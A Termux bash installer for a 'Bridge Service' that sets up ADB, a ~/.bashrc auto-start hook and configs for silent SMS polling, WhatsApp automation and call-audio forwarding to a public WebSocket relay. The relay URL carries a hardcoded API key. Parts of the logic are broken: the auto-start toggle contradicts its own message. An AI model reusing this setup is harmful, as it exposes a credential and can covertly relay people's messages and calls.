#!/data/data/com.termux/files/usr/bin/bash

# =============================================
# BRIDGE SERVICE AUTO-SETUP SCRIPT
# =============================================

set -e  # Exit on error

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Logging functions
log_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

log_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

log_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if running in Termux
check_termux() {
    if [ ! -d "/data/data/com.termux/files/usr" ]; then
        log_error "This script must be run in Termux!"
        exit 1
    fi
    log_success "Running in Termux environment"
}

# Update and upgrade system
update_system() {
    log_info "Updating Termux packages..."
    pkg update -y
    pkg upgrade -y
    log_success "System updated successfully"
}

# Install essential packages
install_essentials() {
    log_info "Installing essential packages..."
    
    pkg install -y python clang make cmake libjpeg-turbo libpng freetype harfbuzz android-tools termux-api procps git
    # Basic tools
    pkg install -y python git wget curl nano vim
    
    # Development tools
    pkg install -y clang make cmake
    
    # Audio tools
    pkg install -y pulseaudio sox
    
    # Android tools
    pkg install -y android-tools termux-api
    
    # Additional utilities
    pkg install -y termux-exec termux-tools procps
    
    log_success "Essential packages installed"
}

# Install Python packages
install_python_packages() {
    log_info "Installing Python packages..."
    
    # Upgrade pip first
    pip install --upgrade pip
    
    # Core dependencies
    pip install websocket-client
    pip install adbutils
    pip install pillow
    pip install requests
    pip install urllib3
    
    # Optional but recommended
    pip install uiautomator2
    pip install opencv-python
    pip install numpy
    
    # For audio processing
    pip install pyaudio
    pip install wave
    pip install soundfile
    
    log_success "Python packages installed"
}

# Setup Android Debug Bridge (ADB)
setup_adb() {
    log_info "Setting up ADB..."
    
    # Check if ADB is available
    if command -v adb &> /dev/null; then
        log_success "ADB is already installed"
    else
        log_warning "ADB not found, installing..."
        pkg install -y android-tools
    fi
    
    # Create ADB configuration directory
    mkdir -p ~/.android
    
    # Start ADB server
    adb start-server
    
    log_info "ADB setup completed"
    log_info "Please connect your Android device and enable USB debugging"
}

# Setup project directory structure
setup_project_structure() {
    log_info "Setting up project structure..."
    
    # Create main project directory
    PROJECT_DIR="/data/data/com.termux/files/home/bridgeservice"
    mkdir -p "$PROJECT_DIR"
    cd "$PROJECT_DIR"
    
    # Create subdirectories
    mkdir -p logs backups config scripts
    
    log_success "Project structure created at: $PROJECT_DIR"
}

# Download required project files
download_project_files() {
    log_info "Downloading project files..."
    
    cd "/data/data/com.termux/files/home/bridgeservice"
    
    # List of required files
    FILES=(
        "WhatsAppAutomation.py"
        "CallAudioForwarder.py" 
        "bridgeservice.py"
    )
    
    for file in "${FILES[@]}"; do
        if [ ! -f "$file" ]; then
            log_warning "Please manually create/copy $file to the project directory"
        fi
    done
    
    # Create default configuration file
    create_config_file
    
    log_success "Project files setup completed"
}

# Create default configuration file
create_config_file() {
    log_info "Creating configuration file..."
    
    cat > /data/data/com.termux/files/home/bridgeservice/config/config.json << EOF
{
    "websocket_server": "wss://s14223.blr1.piesocket.com/v3/1?api_key=WVXN94EfJrQO7fSpSwwKJZgxbavdLdKLZBPLLlQR&notify_self=1",
    "use_root_audio": false,
    "silent_mode": true,
    "sms_poll_interval": 3,
    "max_sms_ids": 1000,
    "whatsapp_app": "business",
    "audio_sample_rate": 16000,
    "audio_channels": 1
}
EOF

    log_success "Configuration file created"
}

# Create management scripts
create_management_scripts() {
    log_info "Creating management scripts..."
    
    cd "/data/data/com.termux/files/home/bridgeservice/scripts"
    
    # Start script
    cat > start_bridge.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

cd /data/data/com.termux/files/home/bridgeservice

# Load configuration
source ./config/env.conf 2>/dev/null || true

# Set default values
WS_SERVER=${WS_SERVER:-"wss://s14223.blr1.piesocket.com/v3/1?api_key=WVXN94EfJrQO7fSpSwwKJZgxbavdLdKLZBPLLlQR&notify_self=1"}
SILENT_MODE=${SILENT_MODE:-"true"}
USE_ROOT_AUDIO=${USE_ROOT_AUDIO:-"false"}

export BRIDGE_WS="$WS_SERVER"
export SILENT_MODE="$SILENT_MODE"
export USE_ROOT_AUDIO="$USE_ROOT_AUDIO"

# Kill existing process
pkill -f "python bridgeservice.py" || true

# Start service
echo "Starting Bridge Service..."
nohup python bridgeservice.py > ./logs/service.log 2>&1 &

# Wait a moment and check if started
sleep 2
if pgrep -f "python bridgeservice.py" > /dev/null; then
    echo "✓ Bridge Service started successfully (PID: $(pgrep -f 'python bridgeservice.py'))"
else
    echo "✗ Failed to start Bridge Service"
    exit 1
fi
EOF

    # Stop script
    cat > stop_bridge.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

echo "Stopping Bridge Service..."

# Kill the process
pkill -f "python bridgeservice.py" || true

# Wait for process to terminate
sleep 2

# Force kill if still running
pkill -9 -f "python bridgeservice.py" 2>/dev/null || true

if pgrep -f "python bridgeservice.py" > /dev/null; then
    echo "✗ Failed to stop Bridge Service"
    exit 1
else
    echo "✓ Bridge Service stopped successfully"
fi
EOF

    # Status script
    cat > status_bridge.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

PID=$(pgrep -f "python bridgeservice.py")

if [ -n "$PID" ]; then
    echo "✓ Bridge Service is RUNNING"
    echo "  PID: $PID"
    echo "  Uptime: $(ps -o etime= -p $PID | xargs)"
    echo "  Memory: $(ps -o rss= -p $PID | xargs) KB"
    
    # Check if WebSocket is connected (basic check)
    if netstat -tuln 2>/dev/null | grep -q ':8080'; then
        echo "  WebSocket: ✓ Listening"
    else
        echo "  WebSocket: ✗ Not listening"
    fi
else
    echo "✗ Bridge Service is STOPPED"
fi
EOF

    # Restart script
    cat > restart_bridge.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

cd /data/data/com.termux/files/home/bridgeservice/scripts

./stop_bridge.sh
sleep 3
./start_bridge.sh
EOF

    # Log viewer script
    cat > show_logs.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

LOG_FILE="/data/data/com.termux/files/home/bridgeservice/logs/service.log"

if [ -f "$LOG_FILE" ]; then
    echo "=== Bridge Service Logs (last 50 lines) ==="
    tail -n 50 "$LOG_FILE"
    echo "==========================================="
    echo "Log file: $LOG_FILE"
    echo "File size: $(du -h "$LOG_FILE" | cut -f1)"
else
    echo "Log file not found: $LOG_FILE"
fi
EOF

    # Make scripts executable
    chmod +x *.sh
    
    log_success "Management scripts created"
}

# Create environment configuration
create_environment_config() {
    log_info "Creating environment configuration..."
    
    cat > /data/data/com.termux/files/home/bridgeservice/config/env.conf << EOF
# Bridge Service Environment Configuration
WS_SERVER="wss://s14223.blr1.piesocket.com/v3/1?api_key=WVXN94EfJrQO7fSpSwwKJZgxbavdLdKLZBPLLlQR&notify_self=1"
SILENT_MODE="true"
USE_ROOT_AUDIO="false"

# WhatsApp Configuration
WHATSAPP_APP="business"  # business or messenger

# Audio Configuration
AUDIO_SAMPLE_RATE=16000
AUDIO_CHANNELS=1

# SMS Configuration
SMS_POLL_INTERVAL=3
MAX_SMS_IDS=1000
EOF

    log_success "Environment configuration created"
}

# Setup auto-start on Termux launch
setup_autostart() {
    log_info "Setting up auto-start..."
    
    # Add to bashrc for auto-start when Termux opens
    if ! grep -q "bridgeservice" ~/.bashrc; then
        cat >> ~/.bashrc << 'EOF'

# Auto-start Bridge Service if not running
if [ ! -f /data/data/com.termux/files/home/.no_auto_bridge ] && ! pgrep -f "python bridgeservice.py" > /dev/null; then
    echo "Auto-starting Bridge Service..."
    cd /data/data/com.termux/files/home/bridgeservice/scripts
    ./start_bridge.sh > /dev/null 2>&1 &
fi
EOF
        log_success "Auto-start configured in ~/.bashrc"
    else
        log_info "Auto-start already configured in ~/.bashrc"
    fi
    
    # Create disable auto-start file (optional)
    touch /data/data/com.termux/files/home/.no_auto_bridge
    log_info "To disable auto-start, remove: ~/.no_auto_bridge"
}

# Setup backup and cleanup
setup_backup_cleanup() {
    log_info "Setting up backup and cleanup..."
    
    # Create backup script
    cat > /data/data/com.termux/files/home/bridgeservice/scripts/backup.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

BACKUP_DIR="/data/data/com.termux/files/home/bridgeservice/backups"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
BACKUP_FILE="$BACKUP_DIR/bridge_backup_$TIMESTAMP.tar.gz"

mkdir -p "$BACKUP_DIR"

# Create backup (exclude logs and large files)
tar -czf "$BACKUP_FILE" \
    --exclude="*.log" \
    --exclude="*.pyc" \
    --exclude="__pycache__" \
    -C /data/data/com.termux/files/home/bridgeservice \
    .

echo "Backup created: $BACKUP_FILE"
echo "Size: $(du -h "$BACKUP_FILE" | cut -f1)"
EOF

    # Create cleanup script
    cat > /data/data/com.termux/files/home/bridgeservice/scripts/cleanup.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash

LOG_DIR="/data/data/com.termux/files/home/bridgeservice/logs"
BACKUP_DIR="/data/data/com.termux/files/home/bridgeservice/backups"

# Clean old logs (keep last 7 days)
find "$LOG_DIR" -name "*.log" -mtime +7 -delete

# Clean old backups (keep last 5)
ls -t "$BACKUP_DIR"/*.tar.gz 2>/dev/null | tail -n +6 | xargs -r rm

# Clean Python cache
find /data/data/com.termux/files/home/bridgeservice -name "__pycache__" -type d -exec rm -rf {} + 2>/dev/null
find /data/data/com.termux/files/home/bridgeservice -name "*.pyc" -delete

echo "Cleanup completed"
EOF

    chmod +x /data/data/com.termux/files/home/bridgeservice/scripts/backup.sh
    chmod +x /data/data/com.termux/files/home/bridgeservice/scripts/cleanup.sh
    
    log_success "Backup and cleanup scripts created"
}

# Test installation
test_installation() {
    log_info "Testing installation..."
    
    cd "/data/data/com.termux/files/home/bridgeservice"
    
    # Test Python imports
    if python -c "import websocket; import adbutils; import PIL; print('Python imports OK')" 2>/dev/null; then
        log_success "Python dependencies test passed"
    else
        log_warning "Some Python dependencies may be missing"
    fi
    
    # Test ADB
    if command -v adb &> /dev/null; then
        log_success "ADB test passed"
    else
        log_error "ADB not found"
    fi
    
    # Test project files
    if [ -f "bridgeservice.py" ]; then
        log_success "Project files test passed"
    else
        log_warning "Main project file bridgeservice.py not found"
    fi
    
    log_success "Basic installation testing completed"
}

# Display completion message
show_completion_message() {
    echo
    echo -e "${GREEN}=============================================${NC}"
    echo -e "${GREEN}    BRIDGE SERVICE SETUP COMPLETED!         ${NC}"
    echo -e "${GREEN}=============================================${NC}"
    echo
    echo -e "${BLUE}Next Steps:${NC}"
    echo "1. Connect your Android device with USB debugging enabled"
    echo "2. Copy your project files to: ~/bridgeservice/"
    echo "3. Configure WebSocket server in: ~/bridgeservice/config/env.conf"
    echo "4. Run: cd ~/bridgeservice/scripts && ./start_bridge.sh"
    echo
    echo -e "${BLUE}Management Commands:${NC}"
    echo "  ./start_bridge.sh    - Start service"
    echo "  ./stop_bridge.sh     - Stop service" 
    echo "  ./restart_bridge.sh  - Restart service"
    echo "  ./status_bridge.sh   - Check status"
    echo "  ./show_logs.sh       - View logs"
    echo
    echo -e "${YELLOW}Important Files:${NC}"
    echo "  Project Dir:   ~/bridgeservice/"
    echo "  Config:        ~/bridgeservice/config/env.conf"
    echo "  Logs:          ~/bridgeservice/logs/service.log"
    echo "  Scripts:       ~/bridgeservice/scripts/"
    echo
}

# Main setup function
main() {
    echo
    echo -e "${BLUE}=============================================${NC}"
    echo -e "${BLUE}    BRIDGE SERVICE AUTO-SETUP SCRIPT        ${NC}"
    echo -e "${BLUE}=============================================${NC}"
    echo
    
    # Run setup steps
    check_termux
    update_system
    install_essentials
    install_python_packages
    setup_adb
    setup_project_structure
    download_project_files
    create_environment_config
    create_management_scripts
    setup_backup_cleanup
    setup_autostart
    test_installation
    show_completion_message
}

# Run main function
main "$@"